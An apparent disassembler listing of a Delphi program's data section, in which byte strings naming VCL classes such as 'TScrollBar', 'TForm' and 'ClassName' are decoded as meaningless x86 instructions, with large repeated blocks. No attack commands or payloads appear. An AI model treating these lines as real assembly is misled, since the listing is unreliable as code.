popa
jne r-xdata
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
in al dx
inc eax
add [ ebp + ebp * 8 + 0x45 ] al
jne r-xdata
popa
jo r-xdata
in al dx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al dx
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
clc
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cld
in al dx
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
popad
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
add eax 0x6d726f46
jo r-xdata
jmp r-xdata
pop eax
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
inc esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add al bh
in al dx
inc ebp
add [ ebp - 0x1277ffc0 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ esi ] al
or al 0x54
jns r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60045ec ] dh
arpl [ ecx + 0x6c ] sp
in al dx
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
int3
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
inc ebx
outsb
je r-xdata
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
insb
jo r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
jb r-xdata
inc ebp
cmp al 0xe8
add [ esp + eax * 2 ] al
popad
je r-xdata
add cl [ eax ]
push es
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x440045ef ] ah
int1
inc ebp
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
out dx al
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al bh
jb r-xdata
adc [ eax + 0x6f ] esi
lea eax [ eax ]
pop esp
jmp r-xdata
inc esi
outsd
jb r-xdata
insd
outsd
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl al
out dx eax
inc ebp
add [ edx ] dh
int1
inc ebp
add al bh
add al [ eax ]
add [ eax + ebp * 8 ] bh
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
pushad
inc esi
outsd
jb r-xdata
add eax 0x6d726f46
jmp r-xdata
jae r-xdata
je r-xdata
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or dh ch
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
inc ebp
add [ esi ] al
add [ eax ] al
mov al 0xec
jae r-xdata
jne r-xdata
popad
inc esi
add ah ah
and al [ esi ]
xchg esp eax
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add [ esp + ebx ] dh
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
0x2500045 0x0
lea eax [ ecx ]
pushfd
and [ esi ] eax
fsub [ ecx ]
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ ecx + 0x21d80046 ] bl
inc esi
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
in eax dx
inc ebp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1153ffc0 ] cl
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45e753
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
jo r-xdata
push ebx
je r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
outsd
ja r-xdata
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
dec [ eax + 0x1004611 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
insb
inc ebp
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] al
add [ ecx + ebp * 8 + 0x45 ] bl
add [ edx + 0x1c0045e9 ] al
add al [ eax ]
add [ eax - 0x43ffbbb2 ] ch
adc al 0x42
je r-xdata
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
dec esi
outsd
jb r-xdata
add [ ebx + esi + 0x40 ] bh
add [ eax ] cl
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
out 0x45 eax
push esi
jb r-xdata
outsd
insb
nop
pushfd
jmp 0x144ce9e3
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esp + edx + 0x46 ] bh
dec esi
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
je r-xdata
add al dh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
push esp
test [ eax + eax - 0x34 ] al
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
0x10030045 0x4654
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ esp + edx ] al
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax ] cl
adc eax 0xcc780046
inc esp
add [ eax + 0x60004614 ] bh
leave
inc esp
add al cl
adc al 0x46
add [ eax ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0x28 ] 0xd8004615
pop ss
inc esi
add [ edx + ebx ] cl
inc esi
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax ]
sbb al [ esi ]
in al dx
sbb al [ esi ]
adc [ ebx ] bl
inc esi
add [ ebx + ebx + 0x19e80046 ] ah
inc esi
add [ eax + 0x15 ] cl
inc esi
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
jae r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax - 0x15 ] bl
inc ebp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
fcom [ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add al bh
out 0x45 eax
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
ror [ eax + 0x45e8 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jmp r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x14f3ffc0 ]
add bh bh
insd
and al 0x11
inc eax
add [ ecx ] al
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
or al 0xeb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebp * 8 ] dl
inc ebp
add [ 0x6d726f46 ] al
jae r-xdata
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + ebp * 8 + 0x45 ] bl
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
add eax 0x14000000
0x62060045 0x4e73
inc eax
add [ eax + 0xf0045ea ] ch
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
outsd
imul edx eax 0x6c
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
push cs
jo r-xdata
mov eax eax
lodsb [ esi ]
jmp r-xdata
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] cl
jmp r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x45eadcc0 ]
add [ edi ] cl
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pop esp
in al dx
inc ebp
inc esp
popa
je r-xdata
insb
jns r-xdata
jae r-xdata
add [ eax ] eax
add [ eax ] al
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + ebp * 8 + 0x45 ] bl
je r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shr [ ebx + ebp * 8 + 0xc060045 ] 0x54
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al al
jmp r-xdata
jb r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
inc esp
popa
inc esp
popa
jne r-xdata
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
in al dx
inc eax
add [ ebp + ebp * 8 + 0x45 ] al
jne r-xdata
popa
jo r-xdata
in al dx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
in al dx
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
clc
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cld
in al dx
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
popad
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
add eax 0x6d726f46
jo r-xdata
jmp r-xdata
pop eax
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
inc esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add al bh
in al dx
inc ebp
add [ ebp - 0x1277ffc0 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ esi ] al
or al 0x54
jns r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60045ec ] dh
arpl [ ecx + 0x6c ] sp
in al dx
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
int3
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
inc ebx
outsb
je r-xdata
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
insb
jo r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
jb r-xdata
inc ebp
cmp al 0xe8
add [ esp + eax * 2 ] al
popad
je r-xdata
add cl [ eax ]
push es
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x440045ef ] ah
int1
inc ebp
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
lodsb [ esi ]
out dx al
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al bh
jb r-xdata
adc [ eax + 0x6f ] esi
lea eax [ eax ]
pop esp
jmp r-xdata
inc esi
outsd
jb r-xdata
insd
outsd
add [ esp + edx + 0x1dc00042 ] bh
inc esi
add [ edi + ebx + 0x46 ] dh
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl al
out dx eax
inc ebp
add [ edx ] dh
int1
inc ebp
add al bh
add al [ eax ]
add [ eax + ebp * 8 ] bh
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
pushad
inc esi
outsd
jb r-xdata
add eax 0x6d726f46
jmp r-xdata
jae r-xdata
je r-xdata
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or dh ch
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
inc ebp
add [ esi ] al
add [ eax ] al
mov al 0xec
jae r-xdata
jne r-xdata
popad
inc esi
add ah ah
and al [ esi ]
xchg esp eax
lea eax [ eax + eax - 0x2c ]
adc al 0x42
add [ ebx + ebp + 0x46 ] bl
add [ eax - 0x3ffbdef ] ah
inc si
add [ esp + ebx ] dh
inc esi
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax + ebp ] bh
inc esi
add [ eax + 0x100044f5 ] bh
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax ] dh
sub [ esi ] eax
pushfd
mov dl 0x44
add [ ebp + ecx * 4 + 0x44 ] bh
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ ebx + ebp ] ah
inc esi
add al dh
sub [ esi ] eax
inc eax
nop
inc esp
add [ ebx + ebp - 0x4cdfffba ] bl
inc esp
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 + 0x1b340044 ] ch
inc esi
add [ eax + 0x32 ] al
inc esi
add [ eax - 0x34 ] bh
inc esp
add [ edi + edi ] al
inc esi
add [ edx + eax * 2 + 0x46 ] ah
add [ eax ] ah
inc ecx
inc esi
add [ eax ] dl
int 0x44
add [ ecx * 8 + 0x439c0044 ] dl
inc esi
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x70 ] 0xc000464a
or [ ebp ] eax
push 0xa40044f4
pop edi
inc esi
add [ eax ] ch
adc eax 0x17d80046
inc esi
add [ eax + edx * 2 + 0x20c00046 ] al
inc esi
add [ ecx ] bh
inc esi
add [ ebx + 0x1df80046 ] al
inc esi
add [ eax + 0x6800465e ] cl
inc ebp
inc esi
add [ eax ] bh
inc esi
add [ eax ] ah
sub eax [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
0x2500045 0x0
lea eax [ ecx ]
pushfd
and [ esi ] eax
fsub [ ecx ]
add [ ebx + esi + 0x43e00040 ] al
inc esi
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
pop ds
inc esi
add al dh
add al [ ebp ]
dec esp
and eax 0x8d140046
inc ecx
add [ ecx + 0x21d80046 ] bl
inc esi
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
in eax dx
inc ebp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1153ffc0 ] cl
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45e99e
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
mov al ch
inc ebp
add [ edx + edx * 2 + 0x44 ] bl
add [ 0x6f460500 ] cl
jb r-xdata
jb r-xdata
je r-xdata
add [ 0x14000000 ] al
jae r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
test al 0xea
inc ebp
add [ edi ] cl
insb
add [ gs : eax ] eax
add [ eax ] al
out 0x45 al
add [ eax ] cl
add al [ eax ]
inc eax
push ss
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ esi ] cl
inc ebp
add [ ebx ] al
add [ eax ] al
add [ eax - 0x15 ] bl
inc ebp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
0xc030045 0x4254
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x45eadcc0 ]
add [ edi ] cl
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x14f3ffc0 ]
add bh bh
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
insd
and al 0x11
outsd
imul edx eax 0x6c
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
add [ eax ] al
add [ eax ] al
out 0x45 al
add [ edx + eax ] cl
add bh bh
rcl [ esi ] 0x1
inc esi
add [ ecx ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
0x62060045 0x4e73
add [ eax ] al
0x10030045 0x4654
outsd
jb r-xdata
inc eax
add [ ebx + ebp * 8 + 0x45 ] bl
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
push cs
jo r-xdata
mov eax eax
lodsb [ esi ]
jmp r-xdata
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] cl
jmp r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pop esp
in al dx
inc ebp
inc esp
popa
je r-xdata
insb
jns r-xdata
jae r-xdata
add [ eax ] eax
add [ eax ] al
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
or al 0xeb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebp * 8 ] dl
inc ebp
add [ 0x6d726f46 ] al
jae r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + ebp * 8 + 0x45 ] bl
je r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
